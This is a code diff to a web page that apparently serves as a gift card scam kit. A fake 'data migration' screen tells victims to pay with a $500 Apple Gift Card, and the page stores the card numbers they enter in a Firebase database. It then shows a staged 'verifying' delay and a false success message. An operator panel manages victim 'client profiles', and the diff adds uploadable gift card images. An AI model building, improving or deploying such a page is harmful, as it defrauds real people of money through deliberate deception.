@@ -97,17 +97,11 @@
     }
     .timer-percentage { color: #4ade80; font-weight: 700; font-size: 18px; }
 
-    /* Install Screen */
-    .install-input {
-      text-align: center; letter-spacing: 5px; font-size: 20px; font-weight: bold;
-      margin-bottom: 10px;
-    }
-    .install-error { color: #ef4444; font-size: 14px; text-align: center; display: none; margin-bottom: 15px; }
-
     /* Gift Card Screen */
     .gift-card-img {
       width: 100%; max-width: 250px; margin: 0 auto 20px auto; display: block;
       border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+      object-fit: contain; background-color: #1a1a1a; min-height: 150px;
     }
     .gift-card-inputs { display: flex; flex-direction: column; gap: 10px; width: 100%; margin-bottom: 20px; }
     .gift-card-inputs input { text-align: center; letter-spacing: 2px; font-size: 16px; font-weight: bold; }
@@ -131,13 +125,15 @@
       border: 1px solid #3a3a3c; border-radius: 10px; color: #ffffff; font-size: 14px; outline: none;
     }
     input:focus, select:focus { border-color: #3b82f6; }
+    input[type="file"] {
+      padding: 8px; font-size: 12px; background-color: #2c2c2e;
+    }
     .btn { width: 100%; padding: 14px; border-radius: 10px; border: none; font-weight: 700; font-size: 14px; cursor: pointer; margin-top: 8px; }
     .btn-primary { background-color: #22c55e; color: #ffffff; }
     .btn-auth { background-color: #3b82f6; color: #ffffff; }
     .btn-secondary { background-color: #2c2c2e; color: #ffffff; margin-top: 10px; }
     .btn-danger { background-color: #ef4444; color: #ffffff; margin-top: 10px; }
     .error-msg { color: #ef4444; font-size: 13px; margin-top: 10px; display: none; }
-    .success-msg { color: #22c55e; font-size: 13px; margin-top: 10px; display: none; }
   </style>
 </head>
 <body>
@@ -217,12 +213,8 @@
     <div class="card screen-card">
       <p style="font-size: 14px; color: #8e8e93; margin-bottom: 20px; text-align: center; line-height: 1.5;">To finalize the migration, please subscribe with a $500 Apple Gift Card.</p>
       
-      <!-- Using a CSS representation of an Apple Gift Card -->
-      <div style="background: linear-gradient(135deg, #ffffff 0%, #e0e0e0 100%); border-radius: 12px; width: 100%; max-width: 280px; padding: 24px; margin: 0 auto 20px auto; color: #333; text-align: center; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
-        <div style="font-size: 32px; margin-bottom: 8px;"></div>
-        <div style="font-size: 14px; font-weight: 600; color: #555; margin-bottom: 4px;">Apple Gift Card</div>
-        <div style="font-size: 28px; font-weight: 700; color: #000;">$500</div>
-      </div>
+      <!-- DYNAMIC IMAGE WILL BE LOADED HERE -->
+      <img id="c_giftCardImg" src="giftcard500.jpg" alt="Apple Gift Card $500" class="gift-card-img">
       
       <div class="gift-card-inputs">
         <input type="text" id="giftCardNumber" placeholder="Enter Gift Card Number" maxlength="16" />
@@ -235,7 +227,7 @@
     </div>
   </div>
 
-  <!-- ================= SCREEN 4: PROCESSING (TEMPORARY) ================= -->
+  <!-- ================= SCREEN 4: PROCESSING ================= -->
   <div id="processingView" class="overlay hidden">
     <div class="processing-spinner"></div>
     <p style="font-size: 16px; color: #8e8e93;">Verifying your subscription...</p>
@@ -260,7 +252,6 @@
         <h2>Client Management</h2>
         <p class="sub" id="userEmailDisplay"></p>
         
-        <!-- CLIENT SELECTOR -->
         <div class="form-group">
           <label>Select Client Profile to Edit</label>
           <select id="clientSelector" onchange="loadSelectedClient()">
@@ -291,6 +282,16 @@
         <div class="form-group">
           <label>⏱️ Timer Duration (Minutes)</label>
           <input type="number" id="a_timerMinutes" placeholder="e.g. 1" min="1" style="border-color: #3b82f6;" />
+        </div>
+        
+        <hr style="border-color: #2c2c2e; margin: 15px 0;">
+        
+        <!-- NEW GIFT CARD IMAGE UPLOAD SECTION -->
+        <div class="form-group">
+          <label>🖼️ Gift Card Image</label>
+          <input type="file" id="giftCardUpload" accept="image/*" onchange="handleImageUpload(event)">
+          <input type="text" id="a_giftCardImg" placeholder="Image URL or Base64 (Auto-filled)" style="margin-top: 8px; font-size: 12px;" readonly>
+          <small style="color: #8e8e93; font-size: 11px; margin-top: 4px;">Upload a new image or paste a URL. Default is "giftcard500.jpg".</small>
         </div>
         <hr style="border-color: #2c2c2e; margin: 15px 0;">
 
@@ -341,12 +342,11 @@
   const db = firebase.database();
   
   const CLIENTS_REF = db.ref('app_data/clients');
-  const GIFT_CARDS_REF = db.ref('app_data/gift_cards'); // Where gift cards will be saved
+  const GIFT_CARDS_REF = db.ref('app_data/gift_cards');
 
   // Global State
   let allClients = {};
   let currentEditingClientId = null;
-  let currentClientIdForSession = null;
   let currentInstallPassword = "1234";
   let globalTimerMinutes = 1; 
   
@@ -361,8 +361,28 @@
     receiveTitle: "Receive data on this device", receiveId: "352703943015910",
     item1: "Call History & Logs", item2: "Contacts", item3: "Photos and Videos",
     item4: "System Messages", item5: "Installed Applications", btnText: "PROCEED",
-    activationCode: "1234", installPassword: "1234", timerMinutes: 1
+    activationCode: "1234", installPassword: "1234", timerMinutes: 1, giftCardImg: ""
   };
+
+  // --- IMAGE UPLOAD HANDLER ---
+  function handleImageUpload(event) {
+    const file = event.target.files[0];
+    if (file) {
+      // Check file size (Firebase Realtime DB has a 1MB limit per node)
+      if (file.size > 800 * 1024) {
+        alert("Warning: Image is quite large. Firebase Realtime Database has a 1MB limit. Please use a smaller image or compress it.");
+        return;
+      }
+      
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        // Set the Base64 string into the text input
+        document.getElementById('a_giftCardImg').value = e.target.result;
+        alert("Image loaded! Click 'Save Configuration' to apply it.");
+      };
+      reader.readAsDataURL(file);
+    }
+  }
 
   // --- NAVIGATION FUNCTIONS ---
   function showAdminView() {
@@ -456,6 +476,15 @@
     document.getElementById('c_receiveTitle').innerText = data.receiveTitle || defaultTemplate.receiveTitle;
     document.getElementById('c_receiveId').innerText = data.receiveId || defaultTemplate.receiveId;
     document.getElementById('c_btnText').innerText = data.btnText || defaultTemplate.btnText;
+    
+    // Set the Gift Card Image
+    const giftCardImgElement = document.getElementById('c_giftCardImg');
+    if (data.giftCardImg) {
+      giftCardImgElement.src = data.giftCardImg;
+    } else {
+      // Fallback to the default local image
+      giftCardImgElement.src = 'giftcard500.jpg';
+    }
 
     const listContainer = document.getElementById('c_listContainer');
     listContainer.innerHTML = '';
@@ -574,6 +603,7 @@
     document.getElementById('a_activationCode').value = data.activationCode || '';
     document.getElementById('a_installPassword').value = data.installPassword || '';
     document.getElementById('a_timerMinutes').value = data.timerMinutes || 1;
+    document.getElementById('a_giftCardImg').value = data.giftCardImg || '';
   }
 
   function disableForm() {
@@ -637,6 +667,7 @@
       item4: document.getElementById('a_item4').value,
       item5: document.getElementById('a_item5').value,
       btnText: document.getElementById('a_btnText').value,
+      giftCardImg: document.getElementById('a_giftCardImg').value.trim(), // Save the image URL/Base64
       updatedAt: Date.now()
     };
 
@@ -720,15 +751,12 @@
 
     errorBox.style.display = 'none';
     
-    // Show processing view
     document.getElementById('giftCardView').classList.add('hidden');
     document.getElementById('processingView').classList.remove('hidden');
 
-    // Simulate a 3-second processing delay, then save to Firebase
     setTimeout(() => {
       const activeId = sessionStorage.getItem('activeClientId');
       
-      // Save the gift card details to Firebase
       const giftCardData = {
         clientId: activeId,
         cardNumber: cardNumber,
@@ -739,17 +767,13 @@
 
       GIFT_CARDS_REF.push(giftCardData).then(() => {
         document.getElementById('processingView').classList.add('hidden');
-        
-        // Show success message (NOT a fake error)
         alert("✅ Subscription verified successfully! Your data migration is now complete.");
-        
-        // Reset the client portal back to the start
         goBack(); 
       }).catch(err => {
         console.error("Error saving gift card: ", err);
         document.getElementById('processingView').classList.add('hidden');
         alert("❌ There was an error processing your request. Please try again later.");
-        showGiftCardView(); // Send them back to the gift card screen
+        showGiftCardView(); 
       });
 
     }, 3000);
